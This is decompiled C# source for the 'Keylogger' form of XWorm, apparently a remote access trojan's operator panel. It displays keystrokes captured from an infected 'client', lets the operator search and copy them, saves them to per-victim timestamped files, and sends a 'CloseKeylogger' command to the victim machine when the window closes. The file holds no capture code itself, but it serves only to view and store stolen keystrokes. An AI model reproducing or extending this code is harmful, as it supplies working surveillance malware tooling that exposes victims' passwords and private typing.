#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

[DesignerGenerated]
public class Keylogger : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem1")]
	private ToolStripMenuItem _CopyToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SelectAllToolStripMenuItem1")]
	private ToolStripMenuItem _SelectAllToolStripMenuItem1;

	public GClass5 gclass5_0;

	public string string_0;

	public StringBuilder stringBuilder_0;


	[field: AccessedThroughProperty("T1")]
	public RichTextBox T1
;

	[field: AccessedThroughProperty("MenuStrip1")]
	public MenuStrip MenuStrip1
	;

	public ToolStripMenuItem ToolStripMenuItem2
	;

	[field: AccessedThroughProperty("TFind")]
	public ToolStripTextBox TFind
	;

	public ToolStripMenuItem ToolStripMenuItem3
	;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2
	;

	public ToolStripMenuItem CopyToolStripMenuItem1
	;

	public ToolStripMenuItem SelectAllToolStripMenuItem1
	;

	public Keylogger()
	{
		base.FormClosing += Keylogger_FormClosing;
		stringBuilder_0 = new StringBuilder();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Keylogger));
		this.T1 = new System.Windows.Forms.RichTextBox();
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.CopyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.SelectAllToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.MenuStrip1 = new System.Windows.Forms.MenuStrip();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.TFind = new System.Windows.Forms.ToolStripTextBox();
		this.ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Guna2ContextMenuStrip2.SuspendLayout();
		this.MenuStrip1.SuspendLayout();
		base.SuspendLayout();
		this.ToolStripMenuItem2.Click += new System.EventHandler(ToolStripMenuItem2_Click);
		this.ToolStripMenuItem3.Click += new System.EventHandler(ToolStripMenuItem3_Click);
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.CopyToolStripMenuItem1.Click += new System.EventHandler(CopyToolStripMenuItem1_Click);
		this.SelectAllToolStripMenuItem1.Click += new System.EventHandler(SelectAllToolStripMenuItem1_Click);
		this.T1.BackColor = System.Drawing.Color.White;
		this.T1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.T1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.T1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.T1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.T1.ForeColor = System.Drawing.Color.Black;
		this.T1.Location = new System.Drawing.Point(0, 27);
		this.T1.Name = "T1";
		this.T1.ReadOnly = true;
		this.T1.Size = new System.Drawing.Size(469, 257);
		this.T1.TabIndex = 3;
		this.T1.Text = "";
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.CopyToolStripMenuItem1, this.SelectAllToolStripMenuItem1 });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(181, 70);
		this.CopyToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.CopyToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("CopyToolStripMenuItem1.Image");
		this.CopyToolStripMenuItem1.Name = "CopyToolStripMenuItem1";
		this.CopyToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.CopyToolStripMenuItem1.Text = "Copy";
		this.SelectAllToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.SelectAllToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("SelectAllToolStripMenuItem1.Image");
		this.SelectAllToolStripMenuItem1.Name = "SelectAllToolStripMenuItem1";
		this.SelectAllToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.SelectAllToolStripMenuItem1.Text = "Select All";
		this.MenuStrip1.BackColor = System.Drawing.Color.White;
		this.MenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.ToolStripMenuItem2, this.TFind, this.ToolStripMenuItem3 });
		this.MenuStrip1.Location = new System.Drawing.Point(0, 0);
		this.MenuStrip1.Name = "MenuStrip1";
		this.MenuStrip1.Size = new System.Drawing.Size(469, 27);
		this.MenuStrip1.TabIndex = 4;
		this.MenuStrip1.Text = "MenuStrip1";
		this.ToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem2.ForeColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem2.Image");
		this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(58, 23);
		this.ToolStripMenuItem2.Text = "Find";
		this.TFind.BackColor = System.Drawing.Color.White;
		this.TFind.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.TFind.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.TFind.ForeColor = System.Drawing.Color.Black;
		this.TFind.Name = "TFind";
		this.TFind.Size = new System.Drawing.Size(100, 23);
		this.TFind.Text = "..";
		this.ToolStripMenuItem3.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem3.ForeColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem3.Image");
		this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
		this.ToolStripMenuItem3.Size = new System.Drawing.Size(59, 23);
		this.ToolStripMenuItem3.Text = "Save";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(469, 284);
		base.Controls.Add(this.T1);
		base.Controls.Add(this.MenuStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Keylogger";
		this.Text = "Keylogger";
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		this.MenuStrip1.ResumeLayout(false);
		this.MenuStrip1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (T1.Find(TFind.Text, checked(T1.SelectionStart + T1.SelectionLength), RichTextBoxFinds.None) == -1)
		{
			T1.Find(TFind.Text, 0, RichTextBoxFinds.None);
		}
	}

	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(T1.Text))
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", string_0, "Keylogger");
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				StreamWriter streamWriter = new StreamWriter(text + "\\KeyLogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", append: false);
				streamWriter.WriteLine(T1.Text);
				streamWriter.Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseKeylogger");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		T1.Copy();
	}

	private void SelectAllToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		T1.SelectAll();
	}
}